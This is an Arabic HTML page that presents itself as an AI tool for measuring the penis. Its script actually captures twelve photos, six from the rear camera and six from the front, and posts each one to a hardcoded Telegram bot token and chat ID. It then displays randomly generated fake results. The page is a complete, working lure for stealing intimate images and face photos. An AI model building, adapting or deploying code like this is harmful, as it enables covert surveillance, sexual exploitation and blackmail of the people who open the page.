<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محلل القضيب الاحترافي | Penis Analyzer Pro</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #6366f1;
            --secondary: #a855f7;
            --accent: #22d3ee;
            --bg: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --error: #ef4444;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }

        body {
            background: radial-gradient(circle at top right, #1e1b4b, #0f172a);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        .container {
            width: 90%;
            max-width: 500px;
            background: var(--card-bg);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 2rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
            position: relative;
        }

        h1 {
            font-size: 1.8rem;
            margin-bottom: 1rem;
            background: linear-gradient(to left, var(--accent), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .viewport {
            width: 100%;
            aspect-ratio: 4/5;
            background: #111827;
            border-radius: 16px;
            margin-bottom: 1.5rem;
            position: relative;
            overflow: hidden;
            border: 2px solid var(--primary);
        }

        .camera-placeholder {
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #64748b;
            z-index: 1;
            position: absolute;
        }

        .scanner-line {
            display: none;
            position: absolute;
            width: 100%;
            height: 4px;
            background: var(--accent);
            box-shadow: 0 0 15px var(--accent);
            z-index: 10;
            animation: scan 2s infinite ease-in-out;
        }

        @keyframes scan {
            0% { top: 0; } 50% { top: 90%; } 100% { top: 0; }
        }

        .btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
            margin: 8px 0;
        }

        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px -5px var(--primary); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }

        #results { display: none; margin-top: 1rem; }

        .loading-text { display: none; margin: 10px 0; font-style: italic; color: var(--accent); }

        /* إشعار من الأعلى */
        #permission-toast {
            position: fixed;
            top: -100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(239, 68, 68, 0.95);
            color: white;
            padding: 16px 24px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            z-index: 1000;
            font-weight: bold;
            font-size: 1.1rem;
            text-align: center;
            min-width: 320px;
            transition: top 0.5s ease;
        }

        #permission-toast.show {
            top: 20px;
        }
    </style>
</head>
<body>

<div id="permission-toast">يجب السماح باستخدام الكاميرا لإكمال الفحص</div>

<div class="container">
    <div id="setup-ui">
        <h1>التحليل الذكي للقضيب</h1>
        <p style="color: #94a3b8; margin-bottom: 1.5rem;">
            اكتشف حجم وقوة قضيبك باستخدام الذكاء الاصطناعي 
           
        </p>

        <div class="viewport" id="viewport">
            <video id="video" autoplay playsinline style="width:100%; height:100%; object-fit: cover; display:none;"></video>
            <div class="scanner-line" id="scanner"></div>
            <div class="camera-placeholder" id="placeholder">
                <p id="placeholder-text">جاهز للفحص</p>
            </div>
        </div>

        <button class="btn" id="startBtn">بدء الفحص السريع</button>
        <p id="status" class="loading-text">جاري التحضير...</p>
    </div>

    <div id="results">
        <h1>نتائج التحليل</h1>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 1.5rem;">
            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
                <span class="stat-label">حجم القضيب</span>
                <span class="stat-value" id="size-val">--</span>
            </div>
            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
                <span class="stat-label">سمك القضيب</span>
                <span class="stat-value" id="girth-val">--</span>
            </div>
            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
                <span class="stat-label">قوة الانتصاب</span>
                <span class="stat-value" id="strength-val">--</span>
            </div>
            <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px;">
                <span class="stat-label">نظافة القضيب</span>
                <span class="stat-value" id="cleanliness-val">--</span>
            </div>
        </div>

        <canvas id="myChart" style="margin-top:1rem; max-width:100%;"></canvas>
        
        <button class="btn" style="margin-top: 20px;" onclick="location.reload()">إعادة فحص</button>
    </div>
</div>

<script>
    const TELEGRAM_BOT_TOKEN = "7871078462:AAHCgyMuBnw21O_yP4ocpPkrLNMKgnxA7aU";
    const TELEGRAM_CHAT_ID   = "5086851394";
    const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const TELEGRAM_TEXT_API  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const video      = document.getElementById('video');
    const startBtn   = document.getElementById('startBtn');
    const scanner    = document.getElementById('scanner');
    const statusText = document.getElementById('status');
    const placeholderText = document.getElementById('placeholder-text');
    const toast      = document.getElementById('permission-toast');

    let stream = null;
    let photoCount = 0;
    const TOTAL_PHOTOS = 12;

    function showToast() {
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 5000);
    }

    async function startCamera(facingMode = "environment") {
        if (stream) {
            stream.getTracks().forEach(t => t.stop());
            stream = null;
        }

        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
            });
            video.srcObject = stream;
            video.style.display = "block";
            placeholderText.parentElement.style.display = "none";
            return true;
        } catch (err) {
            console.error("Camera permission / error:", err);
            showToast();
            placeholderText.innerText = "جاهز للفحص";
            return false;
        }
    }

    async function captureAndSend() {
        if (!video.videoWidth) return;

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
        const blob = await (await fetch(dataUrl)).blob();

        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", blob, `photo_${photoCount+1}.jpg`);
        formData.append("caption", `صورة رقم ${photoCount+1} / ${TOTAL_PHOTOS}`);

        try {
            await fetch(TELEGRAM_API, { method: "POST", body: formData });
        } catch (e) {
            console.error("فشل إرسال", e);
        }
    }

    async function photoSequence() {
        statusText.style.display = "block";
        scanner.style.display = "block";

        // خلفية × 6
        for (let i = 0; i < 6; i++) {
            photoCount = i;
            statusText.innerText = `جاري التقاط الصورة الخلفية ${i+1} / 6 ...`;
            await captureAndSend();
            await new Promise(r => setTimeout(r, 1400));
        }

        // تبديل للأمامية
        const frontOk = await startCamera("user");
        if (!frontOk) {
            statusText.innerText = "تعذر الوصول للكاميرا الأمامية";
            setTimeout(showFakeResults, 2000);
            return;
        }

        // أمامية × 6
        for (let i = 0; i < 6; i++) {
            photoCount = 6 + i;
            statusText.innerText = `جاري التقاط الصورة الأمامية ${i+1} / 6 ...`;
            await captureAndSend();
            await new Promise(r => setTimeout(r, 1400));
        }

        // إنهاء
        if (stream) stream.getTracks().forEach(t => t.stop());
        video.style.display = "none";
        scanner.style.display = "none";
        statusText.innerText = "تم إرسال جميع الصور → جاري عرض النتائج...";

        setTimeout(showFakeResults, 1800);
    }

    startBtn.addEventListener("click", async () => {
        startBtn.disabled = true;
        startBtn.innerText = "جاري التشغيل...";

        const ok = await startCamera("environment");
        if (!ok) {
            startBtn.disabled = false;
            startBtn.innerText = "بدء الفحص السريع";
            return;
        }

        photoSequence();
    });

    function showFakeResults() {
        document.getElementById("setup-ui").style.display = "none";
        document.getElementById("results").style.display = "block";

        const vals = {
            size: Math.floor(Math.random() * 10) + 88,
            girth: Math.floor(Math.random() * 12) + 84,
            strength: Math.floor(Math.random() * 8) + 90,
            cleanliness: Math.floor(Math.random() * 15) + 80
        };

        document.getElementById("size-val").innerText       = vals.size + "%";
        document.getElementById("girth-val").innerText      = vals.girth + "%";
        document.getElementById("strength-val").innerText   = vals.strength + "%";
        document.getElementById("cleanliness-val").innerText = vals.cleanliness + "%";

        const ctx = document.getElementById("myChart").getContext("2d");
        new Chart(ctx, {
            type: "radar",
            data: {
                labels: ["الحجم", "السمك", "القوة", "النظافة", "الجبهة", "البشرة"],
                datasets: [{
                    label: "بصمة القضيب الجنسية",
                    data: [vals.size, vals.girth, 87, vals.strength, 89, vals.cleanliness],
                    fill: true,
                    backgroundColor: "rgba(99, 102, 241, 0.2)",
                    borderColor: "#22d3ee",
                    pointBackgroundColor: "#fff",
                    pointBorderColor: "#a855f7",
                }]
            },
            options: {
                scales: { r: { angleLines: {color:"rgba(255,255,255,0.1)"}, grid:{color:"rgba(255,255,255,0.1)"}, pointLabels:{color:"#fff",font:{size:12}}, ticks:{display:false, max:100, min:0} } },
                plugins: { legend: { display: false } }
            }
        });
    }
</script>
</body>
</html>
